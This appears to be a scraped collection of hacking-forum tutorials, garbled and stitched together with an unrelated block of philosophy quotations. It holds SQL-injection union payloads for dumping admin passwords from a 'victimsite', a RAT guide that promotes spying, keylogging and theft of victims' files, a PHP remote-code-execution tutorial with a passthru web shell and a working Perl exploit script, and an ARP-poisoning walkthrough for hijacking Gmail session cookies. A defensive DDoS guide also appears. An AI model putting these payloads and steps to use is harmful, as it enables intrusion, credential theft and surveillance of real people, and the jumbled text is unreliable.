from information_schema.tables where table_schema=database()--  Now it will show the list of table names. Find the table name which is related with the admin or user.  Now select the \""admin \"" table. if the version is 4 or some others, you have to guess the table names. (user, tbluser).  It is hard and bore to do sql inection with version 4. Step 7: Finding the Column Name Now replace the \""group_concat(table_name) with the \""group_concat(column_name)\"" Replace the \""from information_schema.tables where table_schema=database()--\"" with \""FROM information_schema.columns WHERE table_name=mysqlchar-- Now listen carefully ,we have to find convert the table name to MySql CHAR() string and replace mysqlchar with that . Find MysqlChar() for Tablename: First of all install the HackBar addon: https://addons.mozilla.org/en-US/firefox/addon/3899/ Now select sql->Mysql->MysqlChar() This will open the small window ,enter the table name which you found. i am going to use the admin table name. click ok Now you can see the CHAR(numbers separated with commans) in the Hack toolbar. Copy and paste the code at the end of the url instead of the \""mysqlchar\"" For eg: http://www.victimsite.com/index.php?id=-2  and 1=2 union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_name=CHAR(97, 100, 109, 105, 110)-- Now it will show the list of columns. like admin,password,admin_id,admin_name,admin_password,active,id,admin_name,admin_pas  s,admin_id,admin_name,admin_password,ID_admin,admin_username,username,password..etc.. Now replace the replace group_concat(column_name) with group_concat(columnname,0x3a,anothercolumnname). Columnname should be replaced from the listed column name. anothercolumnname should be replace from the listed column name. Now replace the \"" from information_schema.columns where table_name=CHAR(97, 100, 109, 105, 110)\"" with the \""from table_name\"" For eg: http://www.victimsite.com/index.php?id=-2   and 1=2 union select 1,2,group_concat(admin_id,0x3a,admin_password),4,5,6,7 from admin-- Sometime it will show the column is not found. Then try another column names Now it will Username and passwords. Enjoy..!!cheers..!! If the website has members then jock-bot for you. You will have the list of usernames and password.  Some time you may have the email ids also,enjoy you got the Dock which can produce the golden eggs.  Step 8: Finding the Admin Panel: Just try with url like: http://www.victimsite.com/admin.php http://www.victimsite.com/admin/ http://www.victimsite.com/admin.html http://www.victimsite.com:2082/ etc. If you have luck ,you will find the admin page using above urls. or try this list . Here is the list of admin urls: http://www.ziddu.com/download/13163866/A...t.zip.html @!!Enjoy Hacking!!@ """

The metamorphosis was complete    a graceful, uncertain adolescent had entered this cafe one hour    earlier; now a man left, a leader among Frenchmen.  Lucien took a few    steps in the glorious light of a French morning.  At the corner of       Rue des Ecoles and the Boulevard Saint-Michel he went towards a   stationery shop and looked at himself in the mirror he would have    liked to find on his own face the impenetrable look he admired on    Lemordants.  But the mirror only reflected a pretty, headstrong    little face that was not yet terrible.  Ill grow a moustache,    he decided. --Sartre,   The whole problem with the world is that fools and fanatics are always    so full of themselves, but wiser people so full of doubts. --Russell,   Mathematics, rightly viewed, posses not only truth, but supreme    beauty cold and austere, like that of sculpture. --Russell,   The person who writes for fools is always sure of a large audience. --Schopenhauer,   With people of limited ability modesty is merely honesty.  But    with those who possess real talent it is hypocrisy. --Schopenhauer,   Seek not the favor of the multitude; it is seldom got by honest and lawful means.      But seek the testimony of few; and number not voices, but weigh them. --Kant,   At this moment, when each of us must fit an arrow to his bow and    enter the lists anew, to reconquer, within history and in spite of it,    that which he owns already, the thin yield of his fields, the brief    love of the earth, at this moment when at last a man is born, it is    time to forsake our age and its adolescent furies.  The bow bends;    the wood complains.  At the moment of supreme tension, there will    leap into flight an unswerving arrow, a shaft that is inflexible and    free. --Camus,   We forfeit three-quarters of ourselves in order to be like other people. --Schopenhauer,   Style is what gives value and currency to thoughts. --Schopenhauer,   Every truth passes through three stages before it is recognized.  In    the first it is ridiculed, in the second it is opposed, in the third    it is regarded as self evident. --Schopenhauer,   Before the Law stands a doorkeeper.  To this doorkeeper there comes a    man from the country who begs for admittance to the Law.  But the doorkeeper    says that he cannot admit the man at the moment.  The man, on reflection, asks    if he will be allowed, then, to enter later.  It is possible, answers    the doorkeeper, but not at this moment.  Since the door leading into the Law    stands open as usual and the doorkeeper steps to one side, the man bends    down to peer through the entrance.  When the doorkeeper sees that, he laughs    and says If you are so strongly tempted, try to get in without my    permission.  But note that I am powerful.  And I am only the lowest    doorkeeper.  From hall to hall, keepers stand at every door, one more powerful    than the other.  And the sight of the third man is already more than even I    can stand.  These are difficulties which the man from the country has not    expected to meet, the Law, he thinks, should be accessible to every man    and at all times, but when he looks more closely at the doorkeeper in his    furred robe, with his huge, pointed nose and long, thin, Tartar beard,    he decides that he had better wait until he gets permission to enter.      The doorkeeper gives him a stool and lets him sit down at the side of    the door.  There he sits waiting for days and years.  He makes many    attempts to be allowed in and wearies the doorkeeper with his importunity.      The doorkeeper often engages him in brief conversation, asking him about    his home and about other matters, but the questions are put quite impersonally,    as great men put questions, and always conclude with the statement that the man    cannot be allowed to enter yet.  The man, who has equipped himself with many    things for his journey, parts with all he has, however valuable, in the hope    of bribing the doorkeeper.  The doorkeeper accepts it all, saying, however,    as he takes each gift I take this only to keep you from feeling that you    have left something undone.  During all these long years the man watches    the doorkeeper almost incessantly.  He forgets about the other doorkeepers,    and this one seems to him the only barrier between himself and the Law.      In the first years he curses his evil fate aloud; later, as he grows old,    he only mutters to himself.  He grows childish, and since in his prolonged    study of the doorkeeper he has learned to know even the fleas in his fur    collar, he begs the very fleas to help him and to persuade the doorkeeper    to change his mind.  Finally his eyes grow dim and he does not know whether    the world is really darkening around him or whether his eyes are only    deceiving him.  But in the darkness he can now perceive a radiance that streams    inextinguishably from the door of the Law.  Now his life is drawing to a close.      Before he dies, all that he has experienced during the whole time of his sojourn    condenses in his mind into one question, which he has never yet put to the    doorkeeper.  He beckons the doorkeeper, since he can no longer raise his stiffening    body.  The doorkeeper has to bend far down to hear him, for the difference in    size between them has increased very much to the mans disadvantage.  What    do you want to know now asks the doorkeeper, you are insatiable.      Everyone strives to attain the Law, answers the man, how does it come    about, then, that in all these years no one has come seeking admittance    but me  The doorkeeper perceives that the man is nearing his end and his    hearing is failing, so he bellows in his ear No one but you could gain    admittance through this door, since this door was intended for you.      I am now going to shut it.  --Kafka,   These are the conclusions of individualism in revolt.  The individual cannot    accept history as it is.  He must destroy reality, not collaborate with it,    in order to reaffirm his own existence. --Camus,   The desire for possession is only another form of the desire to endure; it is    this that comprises the impotent delirium of love.  No human being, even    the most passionately loved and passionately loving, is ever in our possession. --Camus,   In art, rebellion is consummated and perpetuated in the act of real creation,    not in criticism or commentary. --Camus,   There is, therefore, only one categorical imperative.  It is Act only according    to that maxim by which you can at the same time will that it should become a    universal law. --Kant,   You have your way.  I have my way.  As for the right way, the correct way, and    the only way, it does not exist. --Nietzsche,   The person lives most beautifully who does not reflect upon existence. --Nietzsche,   To be free is nothing, to become free is everything. --Hegel,   Man acts as though he were the shaper and master of language, while in fact language    remains the master of man. --Heidegger,   Truth always rests with the minority, and the minority is always stronger than the    majority, because the minority is generally formed by those who really have an    opinion, while the strength of a majority is illusory, formed by the gangs who    have no opinion -- and who, therefore, in the next instant (when it is evident    that the minority is the stronger) assume its opinion... while truth again reverts    to a new minority. --Kierkegaard,   Reading furnishes the mind only with materials of knowledge; it is thinking that    makes what we read ours. --Locke,   I would warn you that I do not attribute to nature either beauty or deformity,    order or confusion.  Only in relation to our imagination can things be called    beautiful or ugly, well-ordered or confused. --Spinoza,   The work of an intellectual is not to mould the political will of others; it is,    through the analyses that he does in his own field, to re-examine evidence and    assumptions, to shake up habitual ways of working and thinking, to dissipate    conventional familiarities, to re-evaluate rules and institutions and to    participate in the formation of a political will (where he has his role as    citizen to play). --Foucault,   The more I read, the more I meditate; and the more I acquire, the more I am    enabled to affirm that I know nothing. --Voltaire,   Completely joyless autumn days followed.  The novel was written, there was    nothing more to be done, and our life consisted of sitting on the rug next to    the stove, staring at the fire.  Besides, we started spending more time apart    than we had before.  She began going out for walks.  And something strange    happened, as had often been the case in my life... I suddenly made a friend.      Yes, yes, imagine, I dont make friends easily as a rule, due to a devilish    peculiarity of mine its a strain for me to be with people, and Im distrustful    and suspicious.  But -- imagine, despite all that, some unlikely, unexpected    fellow, who looks like the devil knows what, will unfailingly make his way into    my heart, and hell be the one I like more than anyone else. --Bulgakov,   But what are smart people smart for, if not to untangle tangled things --Bulgakov,   You pronounced your words as if you refuse to acknowledge the existence of either    shadows or evil.  But would you kindly ponder this question What would your good    do if evil didnt exist, and what would the earth look like if all the shadows    disappeared  After all, shadows are cast by things and people.  Here is a shadow    of my sword.  But shadows also come from trees and from living beings.  Do you want to    strip the earth of all trees and living things just because of your fantasy of enjoying    naked light  Youre stupid. --Bulgakov,   Excuse me, but this is, after all, absurd, said Korovyov, refusing to give in.      It isnt an ID that defines a writer, but what he has written!  How can you know what    ideas are fermenting in my brain  --Bulgakov,   Beauty is a fearful and terrible thing!  Fearful because its undefinable, and it    cannot be defined, because here God gave us only riddles.  Here the shores converge,    here all contradictions live together.  Im a very uneducated man, brother, but Ive    thought about it a lot.  So terribly many mysteries!  Too many riddles oppress man on    earth.  Solve them if you can without getting your feet wet.  Beauty!  Besides, I cant    bear it that some man, even with a lofty heart and the highest mind, should start from    the ideal of the Madonna and end with the ideal of Sodom.  Its even more fearful when    one who already has the ideal of Sodom in his soul does not deny the ideal of the    Madonna either, and his heart burns with it, verily, verily burns, as in his young,    blameless years.  No, man is broad, even too broad, I would narrow him down.  Devil    knows even what to make of him, thats the thing!  Whats shame for the mind is beauty    all over for the heart.  Can there be beauty in Sodom  Believe me, for the vast    majority of the people, thats just where beauty lies -- did you know that secret      The terrible thing is that beauty is not only fearful but also mysterious.  Here the    devil is struggling with God, and the battlefield is the human heart.  --Dostoevsky,   I heard exactly the same thing, a long time ago to be sure, from a doctor, the    elder remarked.  He was then an old man, and unquestionably intelligent.      He spoke just as frankly as you, humorously, but with a sorrowful humor.  I love    mankind, he said, but I am amazed at myself the more I love mankind in general,    the less I love people in particular, that is, individually, as separate persons.      In my dreams, he said, I often went so far as to think passionately of serving    mankind, and, it may be, would really have gone to the cross for people if it were    somehow suddenly necessary, and yet I am incapable of living in the same room with    anyone even for two days, this I know from experience.  As soon as someone is there,    close to me, his personality oppresses my self-esteem and restricts my freedom.  In    twenty-four hours I can begin to hate even the best of men one because he takes too    long eating his dinner, another because he has a cold and keeps blowing his nose.      I become the enemy of people the moment they touch me, he said.  On the other hand,    it has always happened that the more I hate people individually, the more ardent    becomes my love for humanity as a whole. --Dostoevsky,   A man who lies to himself is often the first to take offense.  It sometimes feels    very good to take offense, doesnt it  And surely he knows that no one has offended    him, and that he himself has invented the offense and told lies just for the beauty    of it, that he has exaggerated for the sake of effect, that he has picked on a word    and made a mountain out of a pea -- he knows all of that, and still he is the first    to take offense, he likes feeling offended, it gives him great pleasure, and thus    he reaches the point of real hostility. --Dostoevsky,   If your opponent is weak or does not wish to appear as if he has no idea what you    are talking about, you can easily impose upon him some argument that sounds very deep    or learned, or that sounds indisputable. --Schopenhauer,   Self-knowledge -- the bitterest knowledge of all and also the kind we cultivate    least what is the use of catching ourselves out, morning to night, in the act    of illusion, pitilessly tracing each act back to its root, and losing case after    case before our own tribunal --Cioran,   A man who fears ridicule will never go far, for good or ill he remains on this side    of his talents, and even if he has genius, he is doomed to mediocrity. --Cioran };

0	Rat collection	"""   What is a RAT? A Remote Administration Tool, or simply a RAT, is a software/program used to manipulate/control a slave/targets computer. It will give you, if not total, almost full control of the slaves computer, giving you access to all its files and folders (unless its a limited account), and even access to its network. Remote Administration Tools are created to be used LEGALLY, but it is often considered a malicious software, or simply a malware, with uses, such as spying and information stealing.  Even though it is created for legal purposes such as remote administration of employees computers to monitor their work, or to monitor your childs activity on the Internet, RATting can be considered an illegal activity, and may result to some punishments, depending on what type of illegal activity you did, and if YOU GET CAUGHT.  Basic RAT Functions and Uses RATs have many functions built in them, so I cant really discuss them all here, but Ill give you some common functions which are usually the reasons why most hackers (not to mention skids) want to use this tool. Screen/Webcam Captures - This function is usually used by those who like to stalk their victims (usually their cheating BF or GF/cheating husband or wife/crushes, and the likes). They like to know what they are doing with their computer, or who are they talking/chatting to, etc. In this function, you can actually see the screen of your slaves computer, and he is actually doing at the moment. Keylogger/Stealer - These two functions are very useful when you want to compromise a slaves account. The Keylogger logs every keystroke the slave types on his keyboard, so basically, you can see everything that theyve typed once you got them infected. The Stealer, on the other hand, \""steals\"" saved/cached passwords from your slaves computer. The Stealer usually works on personal computers, and Keyloggers are best on Internet Cafes. File Manager - This function is usually used by \""diggers\"". When I say diggers, what I mean is they are those who like to sniff around the slaves computer for valuable files, such as account credentials (games, social networking sites, e-mail addresses), contacts, examination papers (if you want to cheat), and not to mention nude pictures (yeah, especially if you infected a legit E-whore). You can access all files and folders of the computer, assuming you know how to find your way in the directories, and the user account has administrative rights. If the account doesnt have administrative privileges, then you can only view the users files, but not all the files in the computer. Bot Functions - These functions are useful for those who like to monetize and DDoS. In monetizing, like link-clicking/visiting, they can make a decent amount in just a few days if they have a good number of slaves. In the DDoS functions (Im not sure, but not all RATs have DDoS functions if Im not mistaken), its just the same. If you have a decent amount of slaves, you can take down small sites in a few minutes, depending on the security and endurance of the site. Batch Scripting - This function is usually used by those who wants to punish their slave/s. They either create a nasty batch file, or they just format the whole computer. Note that this is not as easy as 1-2-3 though, because the slave might notice that hes infected if you do this. IP Grabbing - Yes, we all know that theres not much we can do with IP addresses, except for location tracking and a few more exploits in Metasploit. Also note that location tracking isnt that accurate since it only gets the estimated position of the IP address. How To Use a RAT  Now that you know what is a RAT and its common uses, you might be thinking on using one, either to satisfy your curiosity, get revenge, or some other purposes.  To use a RAT, first you will need to choose what RAT you want to use. Below are the 4 popular RATs used here on HF, and a few more useful links to help you get started.

We will now examine a comment form getting comments from a user(\""submit.php\"")  and posting it at \""comments.php\""  We Are analyzing submit.php with simple post method that submits the gathered user input and forward the request to comments.php. /*  submit.php::   Code: <form method=\""POST\"" action=\""\""> <textarea rows=\""10\"" name=\""comments\"" cols=\""60\""></textarea> <p><input type=\""submit\"" value=\""Post\"" name=\""sub\""></p> </form>   comments.php::  Code: <?php $comments = $_POST[comments]; $log = fopen(comments.php,a); fwrite($log,<br />.<br />.<center>.Comments::.<br />.$comments); fclose($log); ?>   Now by just looking at it, we could very easily proove it as insane! How?? Well,as we can see there is a form that submits a user inputted(what-so-ever) comments to comments.php including malicious which writes the comments exactly as users input witout being sanitized.This means that an attacker here is getting full advantage to exploit the vulnerable comments submission form by executing some malicious request, which could be just to gather server details like using phpinfo() which is an exceptional case for attackers these days,or even more pathetic could be getting a shell on a vulnerable server. We will take another example using GET request to display error message and log the ip with the specific message. (its a common vulnerability planted by the coder while developing a website for an organization,etc).x. /* info.php::  Code: <?php $msg = $_GET[msg]; $ip = getenv(REMOTE_ADDR); $error = fopen(errorlog.php,a); fwrite($error,<br />.$msg.<br />.$ip.<br />); fclose($error); ?>   This piece not only effect and vulnerable to remote code execution but  also to several other attacks including xss,javascript  injection,vbscript injection etc. This will too allow a remote attacker to posion the log file and inject  malicious code to the logs.  ================================================================================​ ============================  Now I will highlight another type of remote code execution can also be defined as posioning the cookies [INDENT]Quote:<?php require(\""config.php\""); if(!isset($_COOKIE[admin])) {header(\""Location:admin.php?user=admin\""); }?>[/INDENT]  It can be just more complicated than that, like most possibly there can be usage of sessions to verify admin if the variable \""admin\"" would match \""1\"", how ever this is just an sql query used to select administrator as the user when admin = 1  The query is giving possibly another vulnerability  Yeah, right \""Sql INJection!\""; ================================================================================​ =================================  Remote Code Execution is also possible through headers deposition or an arbitrary file upload if theres a file processing system and is not sanitized. ================================================================================​ =================================  ================================================================================​ ========================= x43 - Exactly How An Attacker Get Advantage Over This Vulnerability And Misuse It! ================================================================================​ =========================  I will highlight exactly how an attacker manage to do this  Likely supposing an attacker finding a vulnerable target and he got hold of the news that a GET variable have been implemented here in order to log a particular data to some specific file lets say x. The attacker will struggle to their best to get hold of the file where the data is being wrote, path arrays are used by the attacker for successfull exploitation and then of course the attacker will likely inject some malicious string in order to check if its filtering the output, in this case no its not doing any checkup or using htmlentities or htmlspecialchars() funcs.So the attacker will likely get a hell lot of benefit from this.Most probably he will try to spawn a shell on the targetted server to gain full advantages of his or her blackhat stuff  Supposing an attack on the slave host  Code: Hidden Content:  You must reply to see links ;? passthru($_GET[attacker]); ?>   This will do the work!   In some other cases like the one \""  Code: if(!isset($admin == 1)    it could be also exploited with great ease, the attacker just have to spoof the variable from the server request and thats not at all difficult being a GET variable :p  Code: Hidden Content:  You must reply to see links   This will do it  and for the cookies thingy its same... just need to edit cookies and you are the master!  Supposingly the below pattern::   Code: if(!isset($_COOKIE[administrator])){ //Some Authencation Headers Below ... }   In this type of pattern, you just change the cookies to administrator and tada you are in as admin!  Its better to handle the case with care.I will now write a little POC(Proof-Of-Concept) in order to explain and exploit the target remotely and quite easily! Its not good but important to use such kind of script to expoit the issue and execute the command successfully,since the browser will surely encode your tags, making the request not at all efficient and successful! The below script would bypass this, and fulfill its purpose at all cost   ================================================================================​ =================  POC:: /*  Code: #!/usr/bin/perl #Php Endangers - Remote Code Execution #POC To inject and execute a malicious request, probably spawning and executing a shell command use LWP::Simple;  use LWP::UserAgent;  sub header()  {print q{  --------------------------------------------------------------------------------  --------- Usage <target> <vulnerable file> <variable> <log file> <shell> <command> Example roc.pl  Hidden Content:  You must reply to see links  info.php msg errorlog.php Hidden Content:  You must reply to see links  ls -la --------------------------------------------------------------------------------  ----------  }}$inject = \""<?php if(get_magic_quotes_gpc()){  /$_GET[cmd]=stripslashes(/$_GET[cmd])/;} passthru(/$_GET[cmd])/; ?>\"";  #You may notice some additional funcs used to inject, these are to execute and produce 99% successful result #it would help and bypass magic_quotes func and stripslashes too, that would possibly of lot good to the attacker! if(@ARGV !=5){ header(); }$target = @ARGV[0]; $file = @ARGV[1]; $var = @ARGV[2]; $log = @ARGV[3]; $shell = @ARGV[4]; $command = @ARGV[5]; $agent = LWP::UserAgent->new(); $exec = \""http://$target/$file?$var=$inject\""; $agent->get(\""$exec\""); $exec2 = \""http://$target/$log?attacker=$shell&$cmd=$command?\""; $agent->get(\""$exec2\"") or die\""Host Seems Down\""; print \""Injected Successfully!!\""; print \""Check The Shell Manually At\"".\""  \"".\""http://$target/$log?attacker=$shell&$cmd=$command?\"";  #REMOTE CODE EXECUTION #An explanation POC for exploiting the roc(Remote CODE Execution) Vulnerability.    Code: */ ================================================================================​ ===============================  Null Bytes Injection::  In A Piece Of Code Like One Mentioned Below, It Would Be A Wonder To An Attacker How To Eliminate The Compulsory File Extension And Exploit The Vulnerability Or Use The Inclusion To Execute A Shell Upon The Tagetted Server.   Now we can clearly declare the above code as a critical vulnerability, helping attacker to do a lfi or rfi depending on the attackers strategy.But its clear that the inclusion would be failed because of the extension increment issue. Now the attacker would surely like this at all, and will try to elminate the extension by using NULL BYTES Or Posioning null bytes in to the server. Below is an example what exactly happens when a inclusion is performed in such case:: [INDENT]Quote: Hidden Content:  You must reply to see links [/INDENT]  since the code is adding extensions after $file variable means it would be adding .php after .txt, thus making the exploitation dumb,in simple it would make the request looks  like::  Code: Hidden Content:  You must reply to see links   Where such case dont exist! Now the attacker will eliminate the extension to successfully exploit the issue by posioning null bytes in the request  made,below is how the attacker will manage to do so::   Code: Hidden Content:  You must reply to see links   This would make the request eliminate the additional extension, and would  successfully exploit the issue!  ================================================================================​ =====================  x44 - Prevention And Filtration  ================================================================================​ =====================  Prevention::  Its better to design what-so-ever form in such a way that it sanitizes and filters a user input before writing or actually executing the request on  the server. This can be done easily with the ease of php built in htmlentities(); htmlspecialchars(); and most importantly strip_tags and stripslashes functions. This Will abort a malicious request and will execute the request after the malicious tags had been aborted. For instance an attacker trying to inject a piece of code y to a GET variable....  Code: Hidden Content:  You must reply to see links ;? phpinfo(); ?>   now if the file is under htmlentities,htmlspecialchars,strip_tags or stripslashes() protection, then this will make the request of the attacker totally dumb and of course of no use! Supposingly a simple filtration pattern:  /  Code: <?php $data = stripslashes($_GET[data]); $fh = fopen(file.php,a); fwrite($fh,$data); fclose($fh); ?>   This will abort the tags \""<?\"", \""?>\"",\""()\"" and ofcourse will make  the rest of the piece of code of no use since \""phpinfo\"" is not insane or  looks malicious the server will only write that in exact ascii form to  the file. There are even better cures by using magicquotes on, how ever it can cause some other complicated problems if not used properly, so its not recommended to beginners until they know what they are doing. ================================================================================​ ===========================================  x45 - Conclusion  ================================================================================​ =========================================== Conclusion:: I have used several examples to explain the basics of remote code execution and exactly how its planted in web apps. I have tried my level best to explain the terms and consequences in simple and easy words including all piece of codes mentioned here.However I dont hold any responsibility of any misuse or dirtyworks performed by gaining the knowledge within the paper.Beside  this, I strongly recommend all to go through it, its simple and easy  and will awoke the dangers that can be encountered by little careless  mistakes! rolleye: """
0	[Advanced] How to protect your server from DDoS Attack [Tutorial]	"""   Learn how to protect your server from DDoS What is DDoS? denial-of-service attack (DoS attack) or  distributed denial-of-service attack (DDoS attack) is an attempt to make  a machine or network resource unavailable to its intended users.  Although the means to carry out, motives for, and targets of a DoS  attack may vary, it generally consists of the efforts of one or more  people to temporarily or indefinitely interrupt or suspend services of a  host connected to the Internet. Symptoms and manifestations Unusually slow network performance (opening files or accessing web sites) Unavailability of a particular web site Inability to access any web site Dramatic increase in the number of spam emails receivedÃ¢â¬â(this type of DoS attack is considered an e-mail bomb) Methods of attack A \""denial-of-service\"" attack is  characterized by an explicit attempt by attackers to prevent legitimate  users of a service from using that service. There are two general forms  of DoS attacks: those that crash services and those that flood services. A DoS attack can be perpetrated in a number of ways. The five basic types of attack are: 1.  Consumption of computational resources, such as bandwidth, disk space, or processor time. 2.  Disruption of configuration information, such as routing information. 3.  Disruption of state information, such as unsolicited resetting of TCP sessions. 4.  Disruption of physical network components. 5.  Obstructing the communication  media between the intended users and the victim so that they can no  longer communicate adequately. DoS Protection via APF, BFD, DDOS and RootKit Being a web host, your servers are constantly being attacked by hackers  by denial-of-service (DoS) and other brute force attacks. There is no  foolproof method to stop 100% of all attacks, but there are ways to  protect your servers by applying firewall rules, and detecting and  banning attacking IPs. this part of thread makes use of the APF, BFD, DDoS Deflate and RootKit  to detect and protect your server from denial-of-service type attacks.  To apply those utilities, please follow the instructions below: To begin installation, login to your server as a root user. Quote: % ssh -l root [hostname] root@[hostname]s password: [password] Last login: [Date] from [hostname] APF  --  Advanced Policy-based Firewall Get the latest source from the rfxnetworks, and install the software.

Quote: DEVEL_MODE=\""0\"" IG_TCP_CPORTS=\""21,22,25,53,80,110,143,443,3306\"" IG_UDP_CPORTS=\""53,111\"" USE_AD=\""1\"" By default, APF is setup to run in development mode which flushes  firewall rules every 5 minutes. Running in development mode defeats the  purpose of running APF, as it will automatically flush every 5 minutes.  Configure the Ingress (inbound) TCP and UDP ports that need to be  opened. Finally, enable AntiDos by setting USE_AD=\""1\"". Edit the /etc/apf/ad/conf.antidos as you fit necessary, and start the APF firewall. Quote: # apf --start BFD  --  Brute Force Detection BFD is a shell script which parses security logs and detects  authentication failures. It is a brute force implementation without much  complexity, and it works in conjunction with a APF (Advanced  Policy-based Firewall).

Download  Hidden Content:  You must reply to see links 2.  Unfortunately, this is where a  little bit of work comes in for you. You have to purchase a VPS  (Virtual Private Server) that you can use to route your traffic through,  preferably one with DDoS protection, and one that supports SSH  Tunneling. After some searching around, I recommend  Hidden Content:  You must reply to see links . The SSH Tunneling option is the one we want. 3.  Enter the information of your VPS into Putty, as shown here. Port  22  is standard for SSH. 4.  Expand Ã¢â¬ÅConnectionÃ¢â¬Â, then  Ã¢â¬ÅSSHÃ¢â¬Â, then Ã¢â¬ÅTunnelsÃ¢â¬Â, and then add Ã¢â¬Å8080″ to where it says Ã¢â¬ÅSource  portÃ¢â¬Â, then check the Ã¢â¬ÅDynamicÃ¢â¬Â bubble below. It should look like this.  Once youÃ¢â¬â¢ve entered this information, push Ã¢â¬ÅAddÃ¢â¬Â, and then D8080 should show up in the white box. 5.  Once youÃ¢â¬â¢ve finished this,  return to the Session menu, enter whatever name youÃ¢â¬â¢d like in the Ã¢â¬ÅSaved  SessionsÃ¢â¬Â box, and click Ã¢â¬ÅSaveÃ¢â¬Â. 6.  Now click Ã¢â¬ÅOpenÃ¢â¬Â on Putty. A  black box should come up prompting you for a user name/password, which  will vary based on the service you set up. You might have to click  Ã¢â¬ÅAcceptÃ¢â¬Â or Ã¢â¬ÅOkayÃ¢â¬Â on another box that comes up first; this is normal. Congratulations, now youÃ¢â¬â¢re connected to your VPS via SSH tunneling.  YouÃ¢â¬â¢re able to share this with as many people as youÃ¢â¬â¢d like, too, as  long as you donÃ¢â¬â¢t go over your monthly bandwidth. Skype conversations  donÃ¢â¬â¢t require very much bandwidth, but IÃ¢â¬â¢d recommend staying away from  video calling or screen sharing, as that could eat up your bandwidth  rather quickly. Use proxy If you use proxy servers, you will cut DDoS attack in very start, As  attacker cannot resolve your real ip he will not be able to DDoS you.

0	Hacking Gmail using the GX cookie Loophole and Its Solution	"""   Hacking Gmail using the GX cookie Loophole and Its Solution   Hey Guys as a Ethical hacker I am always curious to Find the New  Loopholes in Existing websites ,softwares and other things... Today over  the Internet I found a Very Dangerous Loophole in the Gmail (Best  Mailing Services In the World) and I am Going to Share that With You  Guys. I have Tried this from my college Network so there Will be Some  Assumptions and Tools Needed for that... So Read On... NOTE: THIS TUTORIAL IS FOR EDUCATIONAL PURPOSES ONLY !  rolleye:  HEY GOOGLE STAFF  IF YOU FINAL THIS AS INAPPROPRIATE CONTENT. PLEASE INFORM ME TO REMOVE  THIS THANKS!  :P SOME ASSUMPTIONS: You are in Local Area Network (LAN) in a switched / wireless environment : example : office , cyber cafÃÆÃâÃâ Ã¢â¬â¢ÃÆÃ¢â¬Å¡ÃâÃÂ , Mall etc. You know basic networking. Tool used for this attack: Cain & Abel or Any Ethernet Capturing Tool Network Miner Firefox web browser with Cookie Editor add-ons (anEC Cookie Editor) (ALL THE TOOLS MENTIONED HERE ARE AVAILABLE FOR FREE DOWNLOADS YOU JUST HAVE TO GOOGLE THEM) Attack in detail: We assume you are connected to LAN/Wireless network. Our main goal is to  capture Gmail GX cookie from the network. We can only capture cookie  when someone is actually using his gmail. IÃÆÃâÃâÃÂ¢ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¡ÃâÃÂ¬ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¾ÃâÃÂ¢ve noticed  normally in free Classes in College when people normally check their  emails. If you are in cyber cafÃÆÃâÃâ Ã¢â¬â¢ÃÆÃ¢â¬Å¡ÃâÃÂ  or in Mall then there are more  chances of catching people using Gmail. We will go step by step, If you are using Wireless network then you can skip this Step A. A.) Using Cain to do ARP poisoning and routing: Switch allows unicast traffic mainly to pass through its ports. When X  and Y are communicating eachother in switch network then Z will not come  to know what X & Y are communicating, so inorder to sniff that  communication you would have to poison ARP table of switch for X &  Y. In Wireless you donÃÆÃâÃâÃÂ¢ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¡ÃâÃÂ¬ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¾ÃâÃÂ¢t have to do poisoning because  Wireless Access points act like HUB which forwards any communication to  all its ports (recipients). Start Cain from Start > Program > Cain > Cain Click on Start/Stop Snigger tool icon from the tool bar, we will first  scan the network to see what all IPs are used in the network and this  list will also help us to launch an attack on the victim. Then click on Sniffer Tab then Host Tab below. Right click within that  spreadsheet and click on Scan Mac Addresses, from the Target section  select All hosts in my subnet and then press Ok. This will list all host  connected in your network. You will notice you wonÃÆÃâÃâÃÂ¢ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¡ÃâÃÂ¬ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¾ÃâÃÂ¢t  see your Physical IP of your machine in that list. How to check your  physical IP ? Click on start > Run type cmd and press enter, In the command prompt type Ipconfig and enter. This should show your IP address assign to your PC. It will have following outputs: Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : xyz.com IP Address. . . . . . . . . . . . : 192.168.1.2 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.1.1 Main thing to know here is your IP address and your Default Gateway. FOR AMU Its : 10.10.50.1 FOR BSNL Its : 192.168.1.1  Make a note of your IP Address & default gateway. From Cain you will  see list of IP addresses, here you have to choose any free IP address  which is not used anywhere. We assume IP 192.168.1.10 is not used  anywhere in the network. Click on Configure > APR > Use Spoof ed IP and MAC Address > IP Type in 192.168.1.10 and from the poisoning section click on  ÃÆÃâÃâÃÂ¢ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¡ÃâÃÂ¬ÃÆÃ¢â¬Â¦ÃÂ¢Ã¢âÂ¬ÃâUse ARP request PacketsÃÆÃâÃâÃÂ¢ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¡ÃâÃÂ¬ÃÆÃ¢â¬Å¡ÃâÃÂ and click on OK. Within the Sniffer Tab , below click on APR Tab, from the left hand side  click on APR and now click on the right hand top spreadsheet then click  on plus sign tool from top. The moment you click that it will show you  list of IP address on left hand side. Here we will target the victim IP  address and the default gateway. The purpose is to do ARP poisoning between victim and the default  gateway and route the victim traffic via your machine. From the left  side click on Victim IP address, we assume victim is using 192.168.1.15.  The moment you click on victim IP you will see remaining list on the  right hand side here you have to select default gateway IP address i.e.  192.168.1.1 then click on OK. Finally, Click on Start/Stop Sniffer tool menu once again and next click  on Start/Stop APR. This will start poisoning victim and default  gateway. B.) Using Network Miner to capture cookie in plain text We are using Network miner to capture cookie, but Network miner can be  used for manythings from capturing text , image, HTTP parameters, files.  Network Miner is normally used in Passive reconnaissance to collect IP,  domain and OS finger print of the connected device to your machine. If  you donÃÆÃâÃâÃÂ¢ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¡ÃâÃÂ¬ÃÆÃÂ¢ÃÂ¢Ã¢âÂ¬ÃÂ¾ÃâÃÂ¢t have Network miner you can use any other  sniffer available like Wireshark, Iris network scanner, NetWitness etc. We are using 